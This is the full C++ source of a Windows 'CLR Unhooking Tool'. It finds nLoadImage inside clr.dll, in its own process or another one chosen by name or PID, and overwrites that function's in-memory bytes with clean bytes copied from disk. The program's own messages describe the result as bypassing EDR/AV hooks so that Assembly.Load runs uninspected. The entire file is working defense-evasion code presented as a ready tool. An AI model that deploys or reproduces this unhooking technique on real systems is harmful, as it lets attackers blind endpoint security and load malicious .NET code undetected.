#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdio.h>

#pragma comment(lib, "Psapi.lib")

namespace CLRUnhooker {
    namespace Internal {
        LPVOID ScanMemoryForPattern(LPVOID StartAddr, DWORD SearchSize, BYTE* Pattern, DWORD PatternLen) {
            __try {
                for (DWORD Offset = 0; Offset < SearchSize - PatternLen; Offset++) {
                    BOOL Match = TRUE;
                    for (DWORD Index = 0; Index < PatternLen; Index++) {
                        if (*((BYTE*)StartAddr + Offset + Index) != Pattern[Index]) {
                            Match = FALSE;
                            break;
                        }
                    }
                    if (Match) {
                        return (LPVOID)((DWORD_PTR)StartAddr + Offset);
                    }
                }
                return NULL;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                return NULL;
            }
        }

        LPVOID ResolveInternalFunction(const char* DllName, const char* FuncName) {
            HMODULE HMod = GetModuleHandleA(DllName);
            if (HMod == NULL) {
                return NULL;
            }

            SIZE_T NameLen = strlen(FuncName) + 1;
            BYTE* NameBuffer = (BYTE*)malloc(NameLen);
            if (!NameBuffer) {
                return NULL;
            }

            memcpy(NameBuffer, FuncName, NameLen);
            LPVOID NameLocation = ScanMemoryForPattern((LPVOID)HMod, UINT_MAX, NameBuffer, NameLen);
            free(NameBuffer);

            if (NameLocation == NULL) {
                return NULL;
            }

            DWORD_PTR NamePointer = (DWORD_PTR)NameLocation;
            LPVOID PointerLocation = ScanMemoryForPattern((LPVOID)HMod, UINT_MAX, (BYTE*)&NamePointer, sizeof(DWORD_PTR));

            if (PointerLocation == NULL) {
                return NULL;
            }

            LPVOID FunctionAddr = *(LPVOID*)((DWORD_PTR)PointerLocation - sizeof(LPVOID));

            if ((DWORD_PTR)FunctionAddr < (DWORD_PTR)HMod || (DWORD_PTR)FunctionAddr >= (DWORD_PTR)HMod + UINT_MAX) {
                return NULL;
            }

            return FunctionAddr;
        }

        LPVOID ResolveInternalFunctionFromBase(LPVOID ModBase, const char* FuncName, DWORD ModSize, LPVOID RemoteBase) {
            if (ModBase == NULL) {
                printf("[DEBUG] ModBase is NULL\n");
                return NULL;
            }

            printf("[DEBUG] Searching for '%s' in module (size: %u)\n", FuncName, ModSize);
            if (RemoteBase != NULL) {
                printf("[DEBUG] Remote base address: 0x%p\n", RemoteBase);
            }

            SIZE_T NameLen = strlen(FuncName) + 1;
            BYTE* NameBuffer = (BYTE*)malloc(NameLen);
            if (!NameBuffer) {
                printf("[DEBUG] Failed to allocate NameBuffer\n");
                return NULL;
            }

            memcpy(NameBuffer, FuncName, NameLen);
            printf("[DEBUG] Scanning for string '%s' (%zu bytes)...\n", FuncName, NameLen);

            LPVOID NameLocation = ScanMemoryForPattern(ModBase, ModSize, NameBuffer, NameLen);
            free(NameBuffer);

            if (NameLocation == NULL) {
                printf("[DEBUG] String '%s' not found in module\n", FuncName);
                return NULL;
            }

            DWORD_PTR NameRVA = (DWORD_PTR)NameLocation - (DWORD_PTR)ModBase;
            printf("[DEBUG] Found string at RVA 0x%llx\n", NameRVA);

            DWORD_PTR SearchPointer;
            if (RemoteBase != NULL) {
                SearchPointer = (DWORD_PTR)RemoteBase + NameRVA;
                printf("[DEBUG] Searching for remote pointer: 0x%llx\n", SearchPointer);
            }
            else {
                SearchPointer = (DWORD_PTR)NameLocation;
                printf("[DEBUG] Searching for local pointer: 0x%llx\n", SearchPointer);
            }

            for (DWORD i = 0; i < ModSize - sizeof(DWORD_PTR); i++) {
                DWORD_PTR* CurrentPtr = (DWORD_PTR*)((BYTE*)ModBase + i);

                if (*CurrentPtr == SearchPointer) {
                    printf("[DEBUG] Found pointer at offset 0x%x\n", i);

                    if (i >= sizeof(DWORD_PTR)) {
                        DWORD_PTR* PrevPtr = CurrentPtr - 1;
                        DWORD_PTR FuncCandidate = *PrevPtr;

                        DWORD_PTR ExpectedMin = RemoteBase ? (DWORD_PTR)RemoteBase : (DWORD_PTR)ModBase;
                        DWORD_PTR ExpectedMax = ExpectedMin + ModSize;

                        if (FuncCandidate >= ExpectedMin && FuncCandidate < ExpectedMax) {
                            DWORD_PTR FuncRVA = FuncCandidate - ExpectedMin;
                            printf("[DEBUG] Valid function pointer found at RVA 0x%llx\n", FuncRVA);

                            if (RemoteBase != NULL) {
                                return (LPVOID)FuncRVA;
                            }
                            return (LPVOID)FuncCandidate;
                        }
                        else {
                            printf("[DEBUG] Candidate 0x%llx out of range (expected 0x%llx - 0x%llx)\n",
                                FuncCandidate, ExpectedMin, ExpectedMax);
                        }
                    }
                }
            }

            printf("[DEBUG] No valid function pointer found\n");
            return NULL;
        }

        BYTE* CopyProtectedMemory(LPVOID TargetAddr, DWORD CopySize, DWORD* OutSize) {
            if (TargetAddr == NULL || CopySize == 0) {
                *OutSize = 0;
                return NULL;
            }

            DWORD OldProtection;
            if (!VirtualProtect(TargetAddr, CopySize, PAGE_EXECUTE_READWRITE, &OldProtection)) {
                *OutSize = 0;
                return NULL;
            }

            BYTE* Buffer = (BYTE*)malloc(CopySize);
            if (!Buffer) {
                VirtualProtect(TargetAddr, CopySize, OldProtection, &OldProtection);
                *OutSize = 0;
                return NULL;
            }

            __try {
                for (DWORD i = 0; i < CopySize; i++) {
                    Buffer[i] = *((BYTE*)TargetAddr + i);
                }
                VirtualProtect(TargetAddr, CopySize, OldProtection, &OldProtection);
                *OutSize = CopySize;
                return Buffer;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                free(Buffer);
                VirtualProtect(TargetAddr, CopySize, OldProtection, &OldProtection);
                *OutSize = 0;
                return NULL;
            }
        }

        BOOL WriteProtectedMemory(LPVOID TargetAddr, BYTE* SourceData, DWORD WriteSize) {
            if (TargetAddr == NULL || SourceData == NULL || WriteSize == 0) {
                return FALSE;
            }

            DWORD OldProtection;
            if (!VirtualProtect(TargetAddr, WriteSize, PAGE_EXECUTE_READWRITE, &OldProtection)) {
                return FALSE;
            }

            __try {
                for (DWORD i = 0; i < WriteSize; i++) {
                    *((BYTE*)TargetAddr + i) = SourceData[i];
                }
                VirtualProtect(TargetAddr, WriteSize, OldProtection, &OldProtection);
                return TRUE;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                VirtualProtect(TargetAddr, WriteSize, OldProtection, &OldProtection);
                return FALSE;
            }
        }

        HMODULE GetRemoteModuleBase(HANDLE HProc, const char* DllName) {
            DWORD ProcId = GetProcessId(HProc);
            if (!ProcId) {
                return NULL;
            }

            HANDLE HSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, ProcId);
            if (HSnap == INVALID_HANDLE_VALUE) {
                return NULL;
            }

            MODULEENTRY32 ModEntry = { 0 };
            ModEntry.dwSize = sizeof(MODULEENTRY32);

            if (Module32First(HSnap, &ModEntry)) {
                do {
                    if (_wcsicmp(ModEntry.szModule, L"clr.dll") == 0) {
                        CloseHandle(HSnap);
                        return ModEntry.hModule;
                    }
                } while (Module32Next(HSnap, &ModEntry));
            }

            CloseHandle(HSnap);
            return NULL;
        }
    }

    namespace CLR {
        BOOL RestoreNativeFunction(HANDLE HProc) {
            BOOL IsRemoteProcess = (HProc != NULL && HProc != GetCurrentProcess());
            CHAR ClrPath[MAX_PATH] = { 0 };
            HMODULE HClrMod = NULL;
            LPVOID HookedFunctionAddr = NULL;

            if (IsRemoteProcess) {
                printf("[DEBUG] Remote mode enabled\n");
                HClrMod = Internal::GetRemoteModuleBase(HProc, "clr.dll");
                if (HClrMod == NULL) {
                    printf("[DEBUG] Failed to find clr.dll in remote process\n");
                    return FALSE;
                }
                printf("[DEBUG] Found clr.dll at 0x%p\n", HClrMod);

                if (!GetModuleFileNameExA(HProc, HClrMod, ClrPath, MAX_PATH)) {
                    printf("[DEBUG] GetModuleFileNameExA failed (Error -> %d)\n", GetLastError());
                    return FALSE;
                }
                printf("[DEBUG] CLR path -> %s\n", ClrPath);

                MODULEINFO ModInfo = { 0 };
                if (!GetModuleInformation(HProc, HClrMod, &ModInfo, sizeof(MODULEINFO))) {
                    printf("[DEBUG] GetModuleInformation failed (Error -> %d)\n", GetLastError());
                    return FALSE;
                }
                printf("[DEBUG] CLR module size -> %u bytes\n", ModInfo.SizeOfImage);

                BYTE* RemoteBuffer = (BYTE*)malloc(ModInfo.SizeOfImage);
                if (!RemoteBuffer) {
                    printf("[DEBUG] Failed to allocate buffer\n");
                    return FALSE;
                }

                SIZE_T BytesRead;
                if (!ReadProcessMemory(HProc, HClrMod, RemoteBuffer, ModInfo.SizeOfImage, &BytesRead)) {
                    printf("[DEBUG] ReadProcessMemory failed (Error -> %d)\n", GetLastError());
                    free(RemoteBuffer);
                    return FALSE;
                }
                printf("[DEBUG] Read %llu bytes from remote process\n", BytesRead);

                LPVOID TempAddr = Internal::ResolveInternalFunctionFromBase(RemoteBuffer, "nLoadImage", ModInfo.SizeOfImage, HClrMod);
                if (TempAddr == NULL) {
                    printf("[DEBUG] Failed to find nLoadImage in remote buffer\n");
                    free(RemoteBuffer);
                    return FALSE;
                }
                printf("[DEBUG] Found nLoadImage at RVA 0x%p\n", TempAddr);

                HookedFunctionAddr = (LPVOID)((DWORD_PTR)HClrMod + (DWORD_PTR)TempAddr);
                printf("[DEBUG] Hooked function address -> 0x%p\n", HookedFunctionAddr);

                HANDLE HFile = CreateFileA(ClrPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                if (HFile == INVALID_HANDLE_VALUE) {
                    free(RemoteBuffer);
                    return FALSE;
                }

                DWORD FileSize = GetFileSize(HFile, NULL);
                BYTE* DiskBytes = (BYTE*)malloc(FileSize);
                if (!DiskBytes) {
                    CloseHandle(HFile);
                    free(RemoteBuffer);
                    return FALSE;
                }

                DWORD DiskBytesRead;
                ReadFile(HFile, DiskBytes, FileSize, &DiskBytesRead, NULL);
                CloseHandle(HFile);

                LPVOID CleanFunctionAddr = (LPVOID)((DWORD_PTR)DiskBytes + (DWORD_PTR)TempAddr);
                printf("[DEBUG] Clean function at offset 0x%p in disk file\n", (LPVOID)(DWORD_PTR)TempAddr);

                DWORD PatchSize = 30;
                BYTE* CleanBytes = (BYTE*)malloc(PatchSize);
                if (!CleanBytes) {
                    free(DiskBytes);
                    free(RemoteBuffer);
                    return FALSE;
                }

                memcpy(CleanBytes, CleanFunctionAddr, PatchSize);
                free(DiskBytes);

                printf("[DEBUG] Reading hooked bytes before patch...\n");
                BYTE* HookedBytes = (BYTE*)malloc(PatchSize);
                SIZE_T BeforeRead;
                if (ReadProcessMemory(HProc, HookedFunctionAddr, HookedBytes, PatchSize, &BeforeRead)) {
                    printf("[DEBUG] First 16 bytes BEFORE unhook:\n       ");
                    for (int i = 0; i < 16 && i < PatchSize; i++) {
                        printf("%02X ", HookedBytes[i]);
                    }
                    printf("\n");
                }
                free(HookedBytes);

                printf("[DEBUG] Clean bytes from disk:\n       ");
                for (int i = 0; i < 16 && i < PatchSize; i++) {
                    printf("%02X ", CleanBytes[i]);
                }
                printf("\n");

                BOOL Success = FALSE;
                DWORD OldProtection;
                if (VirtualProtectEx(HProc, HookedFunctionAddr, PatchSize, PAGE_EXECUTE_READWRITE, &OldProtection)) {
                    SIZE_T Written;
                    Success = WriteProcessMemory(HProc, HookedFunctionAddr, CleanBytes, PatchSize, &Written);
                    VirtualProtectEx(HProc, HookedFunctionAddr, PatchSize, OldProtection, &OldProtection);

                    if (Success) {
                        printf("[DEBUG] Wrote %llu bytes successfully\n", Written);

                        BYTE* VerifyBytes = (BYTE*)malloc(PatchSize);
                        SIZE_T AfterRead;
                        if (ReadProcessMemory(HProc, HookedFunctionAddr, VerifyBytes, PatchSize, &AfterRead)) {
                            printf("[DEBUG] First 16 bytes AFTER unhook:\n       ");
                            for (int i = 0; i < 16 && i < PatchSize; i++) {
                                printf("%02X ", VerifyBytes[i]);
                            }
                            printf("\n");

                            BOOL BytesMatch = TRUE;
                            for (DWORD i = 0; i < PatchSize; i++) {
                                if (VerifyBytes[i] != CleanBytes[i]) {
                                    BytesMatch = FALSE;
                                    break;
                                }
                            }

                            if (BytesMatch) {
                                printf("[DEBUG] VERIFICATION SUCCESS: Patched bytes match clean bytes!\n");
                            }
                            else {
                                printf("[DEBUG] VERIFICATION WARNING: Patched bytes don't match clean bytes\n");
                            }
                        }
                        free(VerifyBytes);
                    }
                }

                free(CleanBytes);
                free(RemoteBuffer);
                return Success;
            }
            else {
                HClrMod = GetModuleHandleA("clr.dll");
                if (HClrMod == NULL) {
                    return FALSE;
                }

                GetModuleFileNameA(HClrMod, ClrPath, MAX_PATH);

                HookedFunctionAddr = Internal::ResolveInternalFunction("clr.dll", "nLoadImage");
                if (HookedFunctionAddr == NULL) {
                    return FALSE;
                }
            }

            HANDLE HFile = CreateFileA(ClrPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (HFile == INVALID_HANDLE_VALUE) {
                return FALSE;
            }

            DWORD FileSize = GetFileSize(HFile, NULL);
            BYTE* DiskBytes = (BYTE*)malloc(FileSize);
            if (!DiskBytes) {
                CloseHandle(HFile);
                return FALSE;
            }

            DWORD BytesRead;
            ReadFile(HFile, DiskBytes, FileSize, &BytesRead, NULL);
            CloseHandle(HFile);

            HANDLE HMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, FileSize, NULL);
            if (!HMapping) {
                free(DiskBytes);
                return FALSE;
            }

            LPVOID MappedBase = MapViewOfFile(HMapping, FILE_MAP_ALL_ACCESS, 0, 0, FileSize);
            if (!MappedBase) {
                CloseHandle(HMapping);
                free(DiskBytes);
                return FALSE;
            }

            memcpy(MappedBase, DiskBytes, FileSize);
            free(DiskBytes);

            LPVOID CleanFunctionAddr = Internal::ResolveInternalFunctionFromBase(MappedBase, "nLoadImage", FileSize, NULL);
            if (CleanFunctionAddr == NULL) {
                UnmapViewOfFile(MappedBase);
                CloseHandle(HMapping);
                return FALSE;
            }

            DWORD PatchSize = 30;
            BYTE* CleanBytes = (BYTE*)malloc(PatchSize);
            if (!CleanBytes) {
                UnmapViewOfFile(MappedBase);
                CloseHandle(HMapping);
                return FALSE;
            }

            memcpy(CleanBytes, CleanFunctionAddr, PatchSize);

            BOOL Success = FALSE;

            if (IsRemoteProcess) {
                DWORD OldProtection;
                if (VirtualProtectEx(HProc, HookedFunctionAddr, PatchSize, PAGE_EXECUTE_READWRITE, &OldProtection)) {
                    SIZE_T Written;
                    Success = WriteProcessMemory(HProc, HookedFunctionAddr, CleanBytes, PatchSize, &Written);
                    VirtualProtectEx(HProc, HookedFunctionAddr, PatchSize, OldProtection, &OldProtection);
                }
            }
            else {
                Success = Internal::WriteProtectedMemory(HookedFunctionAddr, CleanBytes, PatchSize);
            }

            free(CleanBytes);
            UnmapViewOfFile(MappedBase);
            CloseHandle(HMapping);

            return Success;
        }
    }

    namespace Process {
        DWORD FindByName(const char* ProcName) {
            HANDLE HSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (HSnap == INVALID_HANDLE_VALUE) {
                return 0;
            }

            PROCESSENTRY32 Entry = { 0 };
            Entry.dwSize = sizeof(PROCESSENTRY32);

            WCHAR ProcNameW[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, ProcName, -1, ProcNameW, MAX_PATH);

            if (Process32First(HSnap, &Entry)) {
                do {
                    if (_wcsicmp(Entry.szExeFile, ProcNameW) == 0) {
                        CloseHandle(HSnap);
                        return Entry.th32ProcessID;
                    }
                } while (Process32Next(HSnap, &Entry));
            }

            CloseHandle(HSnap);
            return 0;
        }
    }
}

int main(int argc, char* argv[]) {
    printf("=== CLR Unhooking Tool ===\n\n");

    if (argc > 1) {
        const char* Target = argv[1];
        DWORD ProcId = 0;

        if (atoi(Target) > 0) {
            ProcId = atoi(Target);
            printf("[*] Mode -> Remote Process Unhooking\n");
            printf("[*] Target -> PID %d\n", ProcId);
        }
        else {
            printf("[*] Mode -> Remote Process Unhooking\n");
            printf("[*] Target -> %s\n", Target);

            ProcId = CLRUnhooker::Process::FindByName(Target);
            if (!ProcId) {
                printf("[-] Process not found!\n");
                printf("[-] Make sure %s is running\n", Target);
                printf("[-] Or use PID instead: %s <PID>\n", argv[0]);
                return 1;
            }
        }

        printf("[+] Found PID -> %d\n", ProcId);

        HANDLE HProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcId);
        if (!HProc) {
            printf("[-] Failed to open process (Error -> %d)\n", GetLastError());
            printf("[-] Try running as Administrator\n");
            return 1;
        }

        printf("[*] Unhooking CLR->nLoadImage in remote process...\n");

        if (CLRUnhooker::CLR::RestoreNativeFunction(HProc)) {
            printf("[+] SUCCESS -> CLR nLoadImage unhooked in remote process!\n");
            printf("[+] EDR/AV hooks bypassed\n");
        }
        else {
            printf("[-] FAILED -> Could not unhook CLR in remote process\n");
            printf("[-] clr.dll may not be loaded in target process\n");
        }

        CloseHandle(HProc);
    }
    else {
        printf("[*] Mode -> Local Process Unhooking\n");
        printf("[*] Target -> Current Process (PID -> %d)\n", GetCurrentProcessId());

        printf("[*] Unhooking CLR->nLoadImage in current process...\n");

        if (CLRUnhooker::CLR::RestoreNativeFunction(NULL)) {
            printf("[+] SUCCESS -> CLR nLoadImage unhooked successfully!\n");
            printf("[+] Assembly->Load is now clean\n");
        }
        else {
            printf("[-] FAILED -> Could not unhook CLR\n");
            printf("[-] clr.dll is not loaded (this is a native C++ process)\n");
            printf("[-] This tool should be used with .NET applications\n");
        }
    }

    printf("\n[*] Press Enter to exit...\n");
    getchar();
    return 0;
}